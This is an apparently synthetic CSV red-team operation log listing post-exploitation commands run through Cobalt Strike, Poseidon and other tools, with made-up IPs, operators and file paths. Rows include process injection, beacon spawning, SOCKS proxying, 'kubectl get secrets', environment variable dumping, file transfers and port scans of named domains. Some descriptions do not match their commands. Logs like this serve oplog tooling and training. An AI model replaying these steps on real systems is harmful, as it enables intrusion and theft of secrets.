entry_identifier,start_date,end_date,source_ip,dest_ip,tool,user_context,command,description,output,comments,operator_name,extra_fields,oplog_id,tags
10,2023-08-15 13:30:19,2023-09-02 14:01:27,35.14.5.27,66.1.255.186,Cobalt Strike,alopez@dawson.com,shinject 12473 x64 /growth.bin,PID 31000,Failed,Attempting process injection,Alexander Kim,,,
11,2024-05-19 06:13:05,2024-05-19 06:13:05.798310,90.201.27.188,55.167.201.151,Cobalt Strike,alopez@dawson.com,upload /first/so.html,PID 20381,Success,Attempting a file upload,Jerry Gonzalez,,,
12,2023-07-13 23:54:11,2023-10-11 03:06:14,148.64.118.11,55.167.201.151,Cobalt Strike,afranklin@harrison.com,execute-assembly /pick/occur.exe,PID 10850,Failed,Running a local .NET executable,Alexander Kim,,,
13,2023-08-05 00:52:40,2023-09-02 00:56:40,148.64.118.11,66.1.255.186,OST,alopez@dawson.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Success,Using BBOT safe and passive modules,Manuel Chase,,,
14,2024-02-29 08:04:35,2024-04-17 19:10:22,148.64.118.11,55.167.201.151,Poseidon,afranklin@harrison.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Alexander Kim,,,
15,2023-12-29 07:19:11,2024-04-19 14:00:05,116.163.112.137,66.1.255.186,Poseidon,ipena@lane.com,pty whoami,"PID 31096, Callback 44",Success,Obtaining user context,Manuel Chase,,,
16,2023-09-04 07:39:54,2024-02-11 13:16:07,35.14.5.27,55.167.201.151,Poseidon,ipena@lane.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Failed,Attempting to upload a file,Manuel Chase,,,
17,2023-10-09 08:00:48,2024-01-28 20:20:37,148.64.118.11,149.55.234.226,Cobalt Strike,ipena@lane.com,spawn x64 HTTPS,PID 2061,Failed,Spawning a new beacon,Jerry Gonzalez,,,
18,2024-06-26 01:25:37,2024-06-26 01:25:37.636074,116.163.112.137,55.167.201.151,OST,afranklin@harrison.com,cd /central/own/Congress,PID: 8994,Success,Navigating to a directory,Alexander Kim,,,
19,2023-07-17 22:16:54,2023-12-05 20:16:48,90.201.27.188,149.55.234.226,Cobalt Strike,ipena@lane.com,upload /first/so.html,PID 20381,Failed,Attempting a file upload,Manuel Chase,,,
20,2024-02-07 09:35:56,2024-03-09 21:31:04,116.163.112.137,66.1.255.186,Cobalt Strike,alopez@dawson.com,sleep 7,PID 3213,Success,Sleeping a beacon,Alexander Kim,,,
21,2024-05-21 06:59:08,2024-05-21 06:59:08.149457,116.163.112.137,55.167.201.151,Cobalt Strike,alopez@dawson.com,cd /policy/fear/yourself,PID 14828,Success,Navigating to a directory,Jerry Gonzalez,,,
22,2024-03-01 21:39:02,2024-04-11 08:33:31,35.14.5.27,55.167.201.151,Cobalt Strike,ipena@lane.com,spawn x64 HTTPS,PID 2061,Failed,Spawning a new beacon,Alexander Kim,,,
23,2024-02-21 15:03:24,2024-03-03 13:28:52,90.201.27.188,66.1.255.186,Poseidon,afranklin@harrison.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Failed,Attempting to start a SOCKS proxy,Alexander Kim,,,
24,2023-12-06 01:30:46,2024-01-22 15:21:25,90.201.27.188,55.167.201.151,OST,alopez@dawson.com,download /Congress/fund.docx,PID: 5215,Failed,Downloading a file,Manuel Chase,,,
25,2024-02-01 14:40:34,2024-02-12 14:32:14,35.14.5.27,55.167.201.151,Cobalt Strike,ipena@lane.com,inject-assembly 10023 /during/window.exe,PID 29523,Success,Injecting assembly into a process,Alexander Kim,,,
26,2024-02-07 12:00:25,2024-02-13 10:59:45,90.201.27.188,55.167.201.151,OST,afranklin@harrison.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Success,Using BBOT safe and passive modules,Jerry Gonzalez,,,
27,2023-07-18 07:09:10,2023-08-19 00:00:57,116.163.112.137,149.55.234.226,Cobalt Strike,afranklin@harrison.com,shinject 12473 x64 /growth.bin,PID 31000,Failed,Attempting process injection,Jerry Gonzalez,,,
28,2024-01-23 16:36:41,2024-05-06 18:41:45,35.14.5.27,149.55.234.226,Poseidon,alopez@dawson.com,pty whoami,"PID 31096, Callback 44",Failed,Obtaining user context,Manuel Chase,,,
29,2023-08-27 07:24:50,2023-09-18 21:58:31,35.14.5.27,66.1.255.186,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Failed,Downloading a file,Jerry Gonzalez,,,
30,2024-05-18 18:01:23,2024-05-18 18:01:23.875588,90.201.27.188,149.55.234.226,OST,alopez@dawson.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Jerry Gonzalez,,,
31,2024-04-14 13:15:42,2024-04-25 09:48:23,116.163.112.137,149.55.234.226,OST,alopez@dawson.com,download /Congress/fund.docx,PID: 5215,Failed,Downloading a file,Alexander Kim,,,
32,2024-05-06 11:53:19,2024-05-09 09:20:06,35.14.5.27,66.1.255.186,Cobalt Strike,alopez@dawson.com,cd /policy/fear/yourself,PID 14828,Failed,Navigating to a directory,Manuel Chase,,,
33,2024-02-28 06:06:17,2024-03-28 17:23:43,116.163.112.137,55.167.201.151,Poseidon,ipena@lane.com,pty ./kubectl get pods,"PID 2804, Callback 6",Success,Conducting container discovery,Alexander Kim,,,
34,2024-04-14 14:08:46,2024-04-30 19:13:05,35.14.5.27,66.1.255.186,Cobalt Strike,ipena@lane.com,upload /first/so.html,PID 20381,Success,Attempting a file upload,Jerry Gonzalez,,,
35,2024-05-07 20:36:36,2024-05-08 19:45:42,90.201.27.188,149.55.234.226,Cobalt Strike,afranklin@harrison.com,execute-assembly /pick/occur.exe,PID 10850,Success,Running a local .NET executable,Alexander Kim,,,
36,2024-01-03 08:33:37,2024-04-12 22:38:00,148.64.118.11,55.167.201.151,Poseidon,afranklin@harrison.com,pty kubectl get namespaces,"PID 4839, Callback 49",Failed,Conducting container discovery,Alexander Kim,,,
37,2024-06-22 20:29:23,2024-06-22 20:29:23.882780,90.201.27.188,55.167.201.151,OST,afranklin@harrison.com,bbot -t stephens.com-m nmap,PID: 22204,Failed,Using BBOT port scan,Alexander Kim,,,
38,2024-02-20 09:36:29,2024-04-29 03:35:19,148.64.118.11,55.167.201.151,OST,alopez@dawson.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Jerry Gonzalez,,,
39,2024-01-07 06:06:36,2024-05-05 07:23:09,35.14.5.27,55.167.201.151,OST,afranklin@harrison.com,sleep 3,PID: 8087,Success,Sleeping a beacon,Alexander Kim,,,
40,2023-08-28 04:41:31,2024-04-08 18:33:31,90.201.27.188,149.55.234.226,OST,afranklin@harrison.com,cd /central/own/Congress,PID: 8994,Failed,Navigating to a directory,Manuel Chase,,,
41,2024-03-10 08:09:21,2024-05-06 00:17:40,90.201.27.188,55.167.201.151,Poseidon,ipena@lane.com,sleep 19,"PID 2266, Callback 86",Success,Sleeping a beacon,Manuel Chase,,,
42,2023-08-24 15:12:20,2023-09-30 02:11:28,116.163.112.137,149.55.234.226,Poseidon,alopez@dawson.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Success,Conducting container discovery,Manuel Chase,,,
43,2023-09-22 13:18:18,2024-02-17 17:23:56,148.64.118.11,55.167.201.151,Cobalt Strike,alopez@dawson.com,shinject 12473 x64 /growth.bin,PID 31000,Failed,Attempting process injection,Manuel Chase,,,
44,2024-03-17 04:17:33,2024-05-06 13:13:15,35.14.5.27,66.1.255.186,Poseidon,afranklin@harrison.com,pty ./kubectl get namespaces -n cluster,"PID 29432, Callback 20",Failed,Conducting container discovery,Alexander Kim,,,
45,2024-05-12 18:07:38,2024-05-12 18:07:38.433146,116.163.112.137,149.55.234.226,Cobalt Strike,afranklin@harrison.com,pwd,PID 18794,Failed,Obtaining current working directory,Alexander Kim,,,
46,2023-08-28 14:08:28,2024-03-01 18:02:24,35.14.5.27,55.167.201.151,Cobalt Strike,afranklin@harrison.com,pwd,PID 18794,Failed,Obtaining current working directory,Alexander Kim,,,
47,2023-09-13 05:49:49,2024-02-03 22:22:52,148.64.118.11,55.167.201.151,OST,ipena@lane.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Success,Using BBOT safe and passive modules,Jerry Gonzalez,,,
48,2023-10-27 01:24:22,2023-11-03 20:32:07,90.201.27.188,66.1.255.186,OST,afranklin@harrison.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Failed,Navigating to a directory,Manuel Chase,,,
49,2023-08-18 14:47:41,2024-04-30 12:01:07,116.163.112.137,149.55.234.226,OST,alopez@dawson.com,sleep 3,PID: 8087,Success,Sleeping a beacon,Jerry Gonzalez,,,
50,2023-08-14 19:12:47,2024-01-25 08:09:49,35.14.5.27,55.167.201.151,OST,alopez@dawson.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Failed,Navigating to a directory,Jerry Gonzalez,,,
51,2024-05-18 21:28:21,2024-05-18 21:28:21.318410,116.163.112.137,66.1.255.186,Cobalt Strike,afranklin@harrison.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Success,Selecting executable for post-exploitation jobs,Manuel Chase,,,
52,2023-12-07 00:50:50,2024-04-29 23:18:46,35.14.5.27,66.1.255.186,Cobalt Strike,alopez@dawson.com,upload /first/so.html,PID 20381,Success,Attempting a file upload,Jerry Gonzalez,,,
53,2023-12-10 20:10:47,2024-01-14 13:58:01,90.201.27.188,55.167.201.151,OST,alopez@dawson.com,sleep 3,PID: 8087,Success,Sleeping a beacon,Alexander Kim,,,
54,2024-02-22 16:52:26,2024-04-14 18:38:04,35.14.5.27,149.55.234.226,Poseidon,alopez@dawson.com,pty ./kubectl get namespaces -n cluster,"PID 29432, Callback 20",Failed,Conducting container discovery,Jerry Gonzalez,,,
55,2024-05-24 16:22:17,2024-05-24 16:22:17.762774,116.163.112.137,55.167.201.151,OST,alopez@dawson.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Success,Navigating to a directory,Manuel Chase,,,
56,2024-03-30 10:20:54,2024-04-12 10:07:02,148.64.118.11,55.167.201.151,Cobalt Strike,ipena@lane.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Failed,Selecting executable for post-exploitation jobs,Alexander Kim,,,
57,2023-08-18 02:10:45,2024-03-18 08:03:38,35.14.5.27,55.167.201.151,Poseidon,ipena@lane.com,pty ./kubectl get pods,"PID 2804, Callback 6",Failed,Conducting container discovery,Jerry Gonzalez,,,
58,2024-02-15 05:54:30,2024-04-26 20:28:40,35.14.5.27,55.167.201.151,OST,afranklin@harrison.com,bbot -t stephens.com-m nmap,PID: 22204,Failed,Using BBOT port scan,Manuel Chase,,,
59,2024-02-26 10:45:31,2024-03-24 01:25:44,148.64.118.11,66.1.255.186,Poseidon,alopez@dawson.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Success,Attempting to start a SOCKS proxy,Jerry Gonzalez,,,
60,2024-02-26 22:33:19,2024-03-18 17:30:42,35.14.5.27,55.167.201.151,Cobalt Strike,ipena@lane.com,shinject 12473 x64 /growth.bin,PID 31000,Failed,Attempting process injection,Manuel Chase,,,
61,2023-11-02 12:40:06,2023-11-07 21:32:34,116.163.112.137,66.1.255.186,OST,afranklin@harrison.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Manuel Chase,,,
62,2024-02-26 22:05:05,2024-03-21 00:04:12,35.14.5.27,149.55.234.226,Poseidon,afranklin@harrison.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Success,Attempting to upload a file,Jerry Gonzalez,,,
63,2023-12-12 13:26:08,2024-03-30 23:49:49,148.64.118.11,66.1.255.186,Cobalt Strike,afranklin@harrison.com,pwd,PID 18794,Success,Obtaining current working directory,Manuel Chase,,,
64,2023-09-24 09:15:19,2024-04-01 08:09:54,35.14.5.27,66.1.255.186,Poseidon,ipena@lane.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Failed,Attempting to upload a file,Alexander Kim,,,
65,2024-04-07 03:33:32,2024-05-09 15:03:48,90.201.27.188,66.1.255.186,Cobalt Strike,ipena@lane.com,inject-assembly 10023 /during/window.exe,PID 29523,Failed,Injecting assembly into a process,Manuel Chase,,,
66,2024-03-16 00:06:36,2024-03-16 13:22:25,35.14.5.27,149.55.234.226,OST,afranklin@harrison.com,cd /central/own/Congress,PID: 8994,Success,Navigating to a directory,Manuel Chase,,,
67,2024-02-09 13:41:13,2024-03-02 03:51:07,148.64.118.11,66.1.255.186,Poseidon,alopez@dawson.com,pty whoami,"PID 31096, Callback 44",Success,Obtaining user context,Jerry Gonzalez,,,
68,2024-05-12 09:07:27,2024-05-12 09:07:27.067541,148.64.118.11,66.1.255.186,OST,afranklin@harrison.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Success,Using BBOT safe and passive modules,Manuel Chase,,,
69,2023-11-21 07:23:33,2024-03-04 06:16:31,90.201.27.188,55.167.201.151,Poseidon,alopez@dawson.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Success,Attempting to upload a file,Jerry Gonzalez,,,
70,2024-05-09 00:13:46,2024-05-11 00:37:10,35.14.5.27,55.167.201.151,Poseidon,ipena@lane.com,pty curl,"PID 5852, Callback 25",Success,Attempting to use cURL,Manuel Chase,,,
71,2023-08-19 03:55:20,2023-10-02 02:03:23,148.64.118.11,66.1.255.186,Cobalt Strike,afranklin@harrison.com,pwd,PID 18794,Success,Obtaining current working directory,Alexander Kim,,,
72,2023-08-13 13:10:29,2024-02-17 05:54:56,148.64.118.11,149.55.234.226,Poseidon,alopez@dawson.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Failed,Conducting container discovery,Alexander Kim,,,
73,2023-11-09 08:19:47,2023-12-27 09:42:30,116.163.112.137,149.55.234.226,OST,ipena@lane.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Success,Using BBOT safe and passive modules,Jerry Gonzalez,,,
74,2024-06-19 19:38:58,2024-06-19 19:38:58.571697,148.64.118.11,149.55.234.226,Cobalt Strike,afranklin@harrison.com,upload /first/so.html,PID 20381,Failed,Attempting a file upload,Manuel Chase,,,
75,2024-02-13 06:39:41,2024-05-04 11:51:07,90.201.27.188,66.1.255.186,Cobalt Strike,afranklin@harrison.com,sleep 7,PID 3213,Success,Sleeping a beacon,Alexander Kim,,,
76,2024-04-01 07:12:18,2024-04-15 11:44:17,90.201.27.188,149.55.234.226,Poseidon,afranklin@harrison.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Success,Attempting to start a SOCKS proxy,Jerry Gonzalez,,,
77,2024-01-04 00:12:47,2024-03-20 19:55:09,90.201.27.188,66.1.255.186,Cobalt Strike,alopez@dawson.com,execute-assembly /pick/occur.exe,PID 10850,Success,Running a local .NET executable,Jerry Gonzalez,,,
78,2024-02-14 03:30:59,2024-04-08 19:23:36,148.64.118.11,55.167.201.151,Poseidon,alopez@dawson.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Jerry Gonzalez,,,
79,2023-11-25 08:24:05,2024-03-25 08:23:04,116.163.112.137,149.55.234.226,OST,ipena@lane.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Success,Using BBOT safe and passive modules,Jerry Gonzalez,,,
80,2023-08-31 03:08:51,2023-12-11 18:04:33,35.14.5.27,149.55.234.226,OST,afranklin@harrison.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Alexander Kim,,,
81,2023-09-11 12:19:01,2023-09-29 09:37:53,148.64.118.11,66.1.255.186,Poseidon,afranklin@harrison.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Failed,Conducting container discovery,Alexander Kim,,,
82,2023-10-08 12:38:31,2023-12-11 11:27:50,35.14.5.27,55.167.201.151,Poseidon,afranklin@harrison.com,sleep 19,"PID 2266, Callback 86",Failed,Sleeping a beacon,Jerry Gonzalez,,,
83,2023-11-20 13:16:34,2024-03-28 04:24:33,90.201.27.188,55.167.201.151,Cobalt Strike,alopez@dawson.com,upload /first/so.html,PID 20381,Success,Attempting a file upload,Alexander Kim,,,
84,2024-06-12 10:56:24,2024-06-12 10:56:24.277067,116.163.112.137,55.167.201.151,Cobalt Strike,afranklin@harrison.com,pwd,PID 18794,Success,Obtaining current working directory,Manuel Chase,,,
85,2023-11-04 05:22:38,2023-12-07 12:55:55,116.163.112.137,149.55.234.226,OST,ipena@lane.com,cd /central/own/Congress,PID: 8994,Success,Navigating to a directory,Manuel Chase,,,
86,2023-10-12 09:09:05,2024-01-05 20:35:32,90.201.27.188,66.1.255.186,OST,afranklin@harrison.com,ls,PID: 13028,Failed,Listing files and directories,Manuel Chase,,,
87,2024-06-23 21:50:08,2024-06-23 21:50:08.960564,35.14.5.27,149.55.234.226,Cobalt Strike,alopez@dawson.com,upload /first/so.html,PID 20381,Failed,Attempting a file upload,Manuel Chase,,,
88,2024-03-11 09:25:29,2024-04-23 22:35:18,148.64.118.11,55.167.201.151,Cobalt Strike,afranklin@harrison.com,execute-assembly /pick/occur.exe,PID 10850,Success,Running a local .NET executable,Manuel Chase,,,
89,2023-11-19 10:36:39,2024-02-23 23:23:04,35.14.5.27,55.167.201.151,Poseidon,ipena@lane.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Alexander Kim,,,
90,2023-11-25 22:22:09,2024-03-30 02:16:53,35.14.5.27,66.1.255.186,Cobalt Strike,alopez@dawson.com,sleep 7,PID 3213,Success,Sleeping a beacon,Manuel Chase,,,
91,2023-08-17 08:13:13,2023-10-12 16:43:50,35.14.5.27,149.55.234.226,Cobalt Strike,alopez@dawson.com,shinject 12473 x64 /growth.bin,PID 31000,Failed,Attempting process injection,Jerry Gonzalez,,,
92,2023-08-29 13:07:12,2023-10-12 20:02:47,35.14.5.27,55.167.201.151,Cobalt Strike,ipena@lane.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Success,Selecting executable for post-exploitation jobs,Alexander Kim,,,
93,2023-11-05 06:35:48,2024-03-07 01:09:52,116.163.112.137,149.55.234.226,Poseidon,ipena@lane.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Manuel Chase,,,
94,2024-03-14 07:35:12,2024-03-15 07:38:05,90.201.27.188,149.55.234.226,Poseidon,ipena@lane.com,sleep 19,"PID 2266, Callback 86",Failed,Sleeping a beacon,Jerry Gonzalez,,,
95,2023-07-20 23:43:13,2024-03-20 06:01:38,35.14.5.27,149.55.234.226,Poseidon,ipena@lane.com,pty whoami,"PID 31096, Callback 44",Success,Obtaining user context,Alexander Kim,,,
96,2024-05-31 14:50:44,2024-05-31 14:50:44.621669,148.64.118.11,66.1.255.186,Poseidon,alopez@dawson.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Failed,Conducting container discovery,Jerry Gonzalez,,,
97,2024-02-02 02:08:47,2024-04-20 20:32:44,148.64.118.11,66.1.255.186,OST,alopez@dawson.com,bbot -t stephens.com-m nmap,PID: 22204,Failed,Using BBOT port scan,Jerry Gonzalez,,,
98,2023-09-07 08:29:47,2024-01-06 23:17:59,148.64.118.11,66.1.255.186,Poseidon,ipena@lane.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Success,Conducting container discovery,Manuel Chase,,,
99,2023-10-05 10:49:16,2023-11-10 19:52:12,148.64.118.11,55.167.201.151,Cobalt Strike,ipena@lane.com,execute-assembly /pick/occur.exe,PID 10850,Success,Running a local .NET executable,Jerry Gonzalez,,,
100,2023-09-01 05:16:43,2024-05-03 16:25:06,90.201.27.188,149.55.234.226,OST,alopez@dawson.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Manuel Chase,,,
101,2023-08-26 10:35:15,2023-11-06 17:16:24,148.64.118.11,66.1.255.186,OST,ipena@lane.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Failed,Using BBOT safe and passive modules,Jerry Gonzalez,,,
102,2024-04-09 06:23:07,2024-04-13 04:55:29,116.163.112.137,66.1.255.186,Cobalt Strike,ipena@lane.com,shinject 12473 x64 /growth.bin,PID 31000,Success,Attempting process injection,Jerry Gonzalez,,,
103,2024-01-19 20:42:22,2024-04-01 09:59:41,35.14.5.27,66.1.255.186,Poseidon,ipena@lane.com,getenv,"PID 18369, Callback 13",Success,Attempting to get environment variables,Alexander Kim,,,
104,2023-09-18 12:27:57,2024-02-19 10:58:07,148.64.118.11,66.1.255.186,Poseidon,afranklin@harrison.com,pty curl,"PID 5852, Callback 25",Success,Attempting to use cURL,Manuel Chase,,,
105,2024-01-28 22:10:06,2024-03-25 01:58:03,148.64.118.11,55.167.201.151,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Alexander Kim,,,
106,2024-05-19 06:07:37,2024-05-19 06:07:37.061984,148.64.118.11,55.167.201.151,Poseidon,afranklin@harrison.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Success,Conducting container discovery,Alexander Kim,,,
107,2024-01-09 02:56:40,2024-04-20 08:49:48,35.14.5.27,66.1.255.186,OST,ipena@lane.com,cd /central/own/Congress,PID: 8994,Success,Navigating to a directory,Manuel Chase,,,
108,2024-02-05 16:55:50,2024-02-20 06:48:48,35.14.5.27,66.1.255.186,OST,afranklin@harrison.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Success,Using BBOT safe and passive modules,Jerry Gonzalez,,,
109,2024-05-14 16:00:29,2024-05-14 16:00:29.071002,116.163.112.137,149.55.234.226,Poseidon,alopez@dawson.com,getenv,"PID 18369, Callback 13",Failed,Attempting to get environment variables,Jerry Gonzalez,,,
110,2024-06-27 08:49:49,2024-06-27 08:49:49.645688,116.163.112.137,149.55.234.226,Cobalt Strike,alopez@dawson.com,shinject 12473 x64 /growth.bin,PID 31000,Success,Attempting process injection,Manuel Chase,,,
111,2024-02-12 06:03:27,2024-03-09 19:14:09,116.163.112.137,55.167.201.151,OST,alopez@dawson.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Failed,Navigating to a directory,Jerry Gonzalez,,,
112,2024-03-11 04:41:02,2024-05-06 03:02:44,90.201.27.188,55.167.201.151,Cobalt Strike,alopez@dawson.com,cd /policy/fear/yourself,PID 14828,Failed,Navigating to a directory,Jerry Gonzalez,,,
113,2023-09-19 18:24:03,2024-04-14 16:10:06,148.64.118.11,149.55.234.226,Poseidon,alopez@dawson.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Success,Conducting container discovery,Alexander Kim,,,
114,2023-07-15 16:08:06,2024-03-30 02:38:58,90.201.27.188,55.167.201.151,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Alexander Kim,,,
115,2023-11-01 03:14:03,2024-04-23 13:14:46,90.201.27.188,149.55.234.226,Poseidon,ipena@lane.com,getenv,"PID 18369, Callback 13",Failed,Attempting to get environment variables,Manuel Chase,,,
116,2023-12-06 16:54:07,2024-01-07 18:34:31,116.163.112.137,66.1.255.186,Cobalt Strike,alopez@dawson.com,sleep 7,PID 3213,Success,Sleeping a beacon,Manuel Chase,,,
117,2024-05-30 19:37:44,2024-05-30 19:37:44.498298,90.201.27.188,66.1.255.186,Poseidon,alopez@dawson.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Failed,Conducting container discovery,Manuel Chase,,,
118,2023-12-05 11:58:23,2024-01-04 17:49:20,148.64.118.11,55.167.201.151,Cobalt Strike,alopez@dawson.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Failed,Selecting executable for post-exploitation jobs,Jerry Gonzalez,,,
119,2024-06-10 06:20:49,2024-06-10 06:20:49.673299,148.64.118.11,66.1.255.186,Poseidon,ipena@lane.com,pty ./kubectl get namespaces -n cluster,"PID 29432, Callback 20",Failed,Conducting container discovery,Jerry Gonzalez,,,
120,2023-08-29 05:04:41,2024-02-04 22:24:39,116.163.112.137,55.167.201.151,Poseidon,ipena@lane.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Manuel Chase,,,
121,2024-03-20 15:32:16,2024-04-27 19:00:26,116.163.112.137,149.55.234.226,OST,afranklin@harrison.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Alexander Kim,,,
122,2024-04-09 08:19:24,2024-04-20 21:57:07,35.14.5.27,66.1.255.186,Poseidon,ipena@lane.com,pty kubectl get namespaces,"PID 4839, Callback 49",Failed,Conducting container discovery,Manuel Chase,,,
123,2024-01-04 05:15:40,2024-03-02 12:42:16,148.64.118.11,66.1.255.186,Cobalt Strike,ipena@lane.com,inject-assembly 10023 /during/window.exe,PID 29523,Success,Injecting assembly into a process,Manuel Chase,,,
124,2023-12-07 07:44:29,2024-05-08 00:40:47,116.163.112.137,149.55.234.226,OST,ipena@lane.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Failed,Using BBOT safe and passive modules,Alexander Kim,,,
125,2024-04-17 16:14:27,2024-04-25 21:57:06,148.64.118.11,149.55.234.226,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Failed,Downloading a file,Alexander Kim,,,
